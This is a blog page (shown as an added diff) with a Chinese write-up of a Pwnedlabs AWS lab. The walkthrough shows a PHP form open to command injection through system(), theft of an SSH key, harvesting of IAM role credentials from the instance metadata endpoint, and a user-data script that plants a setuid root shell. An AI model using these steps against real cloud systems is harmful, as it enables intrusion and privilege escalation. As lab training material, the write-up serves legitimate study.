@@ -1,0 +1,383 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[Pwnedlabs]Command Injection to EC2 User Data Privilege Escalation | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[Pwnedlabs]Command Injection to EC2 User Data Privilege Escalation | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="题目地址：https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation
+题目描述：
+
+After a successful smishin..." />
+    <meta name="keywords" content="云安全,AWS,EC2,UserData,权限提升" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [Pwnedlabs]Command Injection to EC2 User Data Privilege Escalation
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-07-03
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/8Ilrlif21/" class="post-tag">
+                  # 云安全
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/su2_uaPzNg/" class="post-tag">
+                  # AWS
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/0reotDeLDj/" class="post-tag">
+                  # EC2
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/PW9X2j8cxM/" class="post-tag">
+                  # UserData
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/0PbqcQRmvO/" class="post-tag">
+                  # 权限提升
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/pwnedlabscommand-injection-to-ec2-user-data-privilege-escalation.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>题目地址：<a href="https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation">https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation</a></p>
+<p>题目描述：</p>
+<blockquote>
+<p>After a successful smishing attack on your client, Huge Logistics, you've obtained AWS credentials for a user account. Your task is to use these initial credentials to explore and possibly expand your access within their cloud environment. Your objective is to demonstrate impact of smishing the user. Let the hunt begin.</p>
+</blockquote>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="aws-userdata">AWS UserData</h2>
+<p>通过编辑 <strong>UserData</strong> 可以让 <strong>EC2</strong> 启动时执行 <strong>Shell脚本</strong> 和 <strong>cloud-init指令</strong>。</p>
+<p>支持的格式有，如果只执行<strong>Shell脚本</strong>，则脚本内容必须以<code>#!</code>开头后面指向要读取脚本的解释器的路径（通常为 <code>/bin/bash</code>）</p>
+<pre><code class="language-shell">#!/bin/bash
+yum update -y
+amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2
+yum install -y httpd mariadb-server
+systemctl start httpd
+systemctl enable httpd
+usermod -a -G apache ec2-user
+chown -R ec2-user:apache /var/www
+chmod 2775 /var/www
+find /var/www -type d -exec chmod 2775 {} \;
+find /var/www -type f -exec chmod 0664 {} \;
+echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php
+</code></pre>
+<p>如果要传递<strong>cloud-init指令</strong>，那么则要以<code>#cloud-config</code>开头</p>
+<pre><code class="language-yaml">#cloud-config
+repo_update: true
+repo_upgrade: all
+
+packages:
+- httpd
+- mariadb-server
+
+runcmd:
+- [ sh, -c, &quot;amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2&quot; ]
+- systemctl start httpd
+- sudo systemctl enable httpd
+- [ sh, -c, &quot;usermod -a -G apache ec2-user&quot; ]
+- [ sh, -c, &quot;chown -R ec2-user:apache /var/www&quot; ]
+- chmod 2775 /var/www
+- [ find, /var/www, -type, d, -exec, chmod, 2775, {}, \; ]
+- [ find, /var/www, -type, f, -exec, chmod, 0664, {}, \; ]
+- [ sh, -c, 'echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php' ]
+</code></pre>
+<p>如果要<strong>cloud-init</strong>和<strong>Shell</strong>混用，则可以使用 mime-multi part 文件类型，使用 <code>text/cloud-config </code>和 <code>text/x-shellscript</code> 来表示<strong>cloud-init指令</strong>和<strong>Shell脚本</strong>。</p>
+<pre><code class="language-yaml">Content-Type: multipart/mixed; boundary=&quot;//&quot;
+MIME-Version: 1.0
+
+--//
+Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;
+
+#cloud-config
+cloud-init directives
+
+--//
+Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;userdata.txt&quot;
+
+#!/bin/bash
+shell script commands
+--//--
+</code></pre>
+<h1 id="解题流程">解题流程</h1>
+<p>使用题目给的AK/SK登录，<code>aws sts get-caller-identity</code>确认身份<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995161639-adbba1ba-52de-4f19-900a-d6ab377efac2.png" alt="image.png" loading="lazy"></p>
+<p>然后就是常规的策略挖掘。从用户的托管策略<code>arn:aws:iam::564061345713:policy/Compute</code>中发现用户拥有<code>ec2:DescribeInstances</code>权限</p>
+<pre><code>aws iam list-attached-user-policies --user-name ryan
+aws iam get-policy --policy-arn arn:aws:iam::564061345713:policy/Compute
+aws iam get-policy-version --policy-arn arn:aws:iam::564061345713:policy/Compute --version-id v1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995316352-3243e9a7-b513-479e-a46f-edeb6a35106f.png" alt="image.png" loading="lazy"></figure>
+<p>尝试列出实例，这里使用<code>--filters</code>筛选出运行的实例，再用<code>--query</code>精简输出的信息。这里看到了一个内网IP为<code>10.8.0.31</code>的运行实例（对实例的访问要使用平台提供的VPN）。</p>
+<pre><code>aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value | [0],InstanceId,Platform,State.Name,PrivateIpAddress,PublicIpAddress,InstanceType,PublicDnsName,KeyName]'
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998921283-fc5c0737-8788-4123-9279-38e3de8ed353.png" alt="image.png" loading="lazy"></figure>
+<p>实例开放了22和80端口<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998916790-4370689c-b0a3-4249-9214-43d72b352294.png" alt="image.png" loading="lazy"></p>
+<p>访问<code>/tracking</code>这里存在一个命令注入的漏洞，导致的原因这里就直接看源码了，正常测我觉得自己是想不到了。</p>
+<pre><code class="language-php">&lt;?php
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST[&quot;tracking-number&quot;] != 'e.g. RH729454758CN') {
+
+  $number = $_POST[&quot;tracking-number&quot;];
+  system(&quot;grep \&quot;$number\&quot; shipment_export.csv 2&gt;&amp;1 &gt; /dev/null &amp;&amp; echo \&quot;&lt;p&gt;The parcel is arriving soon&lt;/p&gt;\&quot; || echo \&quot;&lt;p&gt;Could not find shipment number: $number&lt;/p&gt;\&quot;&quot;);
+}
+
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998886725-8382dc5a-d2e7-4a05-a848-0b9adf6c952c.png" alt="image.png" loading="lazy"></figure>
+<p>这样我们就可以用<code>$(command)</code>来注入命令<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998880778-a520c044-5f1b-4196-b0fc-486bdedf20e9.png" alt="image.png" loading="lazy"></p>
+<p>在<code>/file_backups</code>发现<code>id_rsa</code>文件。<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998853867-3dbfc0b2-c50b-4653-bdd1-960468546bb6.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998871614-8cba45fc-a609-44ad-b81c-16516e13331a.png" alt="image.png" loading="lazy"></p>
+<p>读取保存将其作为实例的私钥尝试登录</p>
+<pre><code>vim id_rsa
+chmod 400 id_rsa
+ssh -i id_rsa ryan@10.222.0.237
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998845144-23b5d467-be99-4ede-a616-3cb27221785e.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998840223-b4111775-4866-493c-9cea-126bc6145d93.png" alt="image.png" loading="lazy"></p>
+<p>请求169.254.169.254查看实例上是否有关联的IAM角色</p>
+<pre><code>curl 169.254.169.254/latest/meta-data/iam/info/
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999089566-ee029003-390e-4908-8531-d2434d456504.png" alt="image.png" loading="lazy"></figure>
+<p>这里显示了一个ComputeAdmin角色，查看它的凭证</p>
+<pre><code>curl 169.254.169.254/latest/meta-data/iam/security-credentials/ComputeAdmin/
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998826694-9943ef0d-21e2-46c9-953c-73583f45687e.png" alt="image.png" loading="lazy"></figure>
+<p>用它提供的凭证扮演角色<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998802915-60ebf549-f97e-47e3-9370-76ea1bf07801.png" alt="image.png" loading="lazy"></p>
+<p>还是策略挖掘一波。在角色托管策略中显示该角色具有<code>ec2:ModifyInstanceAttribute</code>权限，同时也可以停止和启动实例</p>
+<pre><code>aws iam list-attached-role-policies --role-name ComputeAdmin
+aws iam get-policy --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin
+aws iam get-policy-version --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin --version-id v1
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999300825-67f56790-bd14-42b8-ab84-c2eb74740bd4.png" alt="image.png" loading="lazy"></figure>
+<p>所以我们可以停止实例，然后修改实例的Userdata来执行任意命令以实现实例用户 **ryan **的提权。传入的userdata如下：</p>
+<ul>
+<li>使用cloud-init指令指定了 scripts-user 模块，配置为在每次系统启动时都执行。
+<ul>
+<li>scripts-user 模块允许用户编写自定义脚本并确保它们在系统启动时执行。这些脚本通常被放置在实例的 <code>/var/lib/cloud/instance/scripts</code> 目录中。</li>
+</ul>
+</li>
+<li>在shell部分，首先复制 <code>/bin/sh</code> 到 <code>/home/ryan/suid</code>。接着使用 <code>chmod u+s /home/ryan/suid</code> 命令设置 UID 位，使任何用户都可以以 root 用户的权限运行 <code>/home/ryan/suid</code>。</li>
+</ul>
+<pre><code>Content-Type: multipart/mixed; boundary=&quot;//&quot;
+MIME-Version: 1.0
+
+--//
+Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;
+
+#cloud-config
+cloud_final_modules:
+- [scripts-user, always]
+
+--//
+Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;userdata.txt&quot;
+
+#!/bin/bash
+cp /bin/sh /home/ryan/suid
+chmod u+s /home/ryan/suid
+whoami &gt;&gt; /home/ryan/output
+--//
+</code></pre>
+<p>将上面的文件保存为<code>userdata.txt</code>，再将其输出为base64编码</p>
+<pre><code>base64 -i userdata.txt -o userdata.b64.txt
+</code></pre>
+<p>在实例中查看通过元数据查看实例ID</p>
+<pre><code># curl http://169.254.169.254/latest/meta-data/instance-id
+i-0d9a8dae1fb451cff
+</code></pre>
+<p>ComputeAdmin角色也确实拥有该实例权限<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011322191-2ea5cbf4-ed66-4c54-997f-c4e7b29e4c2f.png" alt="image.png" loading="lazy"></p>
+<p>暂停实例</p>
+<pre><code>aws ec2 stop-instances --instance-id i-0d9a8dae1fb451cff
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011010761-b08633df-2946-4b6d-b260-aaf95345659e.png" alt="image.png" loading="lazy"></figure>
+<p>修改userdata</p>
+<pre><code>aws ec2 modify-instance-attribute --instance-id=i-0d9a8dae1fb451cff --attribute userData --value file://userdata.b64.txt
+</code></pre>
+<p>启动实例</p>
+<pre><code>aws ec2 start-instances --instance-id i-0d9a8dae1fb451cff
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011738806-dc79a222-8c97-4a69-ac31-127f2f7e2b64.png" alt="image.png" loading="lazy"></figure>
+<p>ssh连上后在用户目录下出现了我们复制的suid，执行<code>./suid -p</code>当前shell权限变成root<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012083978-75f86c30-542e-4d6f-80c9-43634ff5fe87.png" alt="image.png" loading="lazy"></p>
+<p>查看output文件可以得知userdata是以root权限执行的<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012503404-e58e79be-a31f-45c9-98a3-a34c0d6add1b.png" alt="image.png" loading="lazy"></p>
+<p><code>cloud-config.txt</code>被复制到<code>/var/lib/cloud/instance/</code>目录下<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012510953-ef6bcc91-d20f-46bd-a1b8-12603f936da3.png" alt="image.png" loading="lazy"></p>
+<p><code>userdata.txt</code>被复制到<code>/var/lib/cloud/instance/scripts/</code>目录下<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012515086-422cc7e2-9230-4f5a-885c-ef73278f85fd.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html</a><br>
+<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html%5D">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#aws-userdata">AWS UserData</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">解题流程</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/">
+              <h3 class="post-title">
+                [Docker容器安全3]Docker文件存储 &amp; 挂载宿主机 procfs 容器逃逸
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
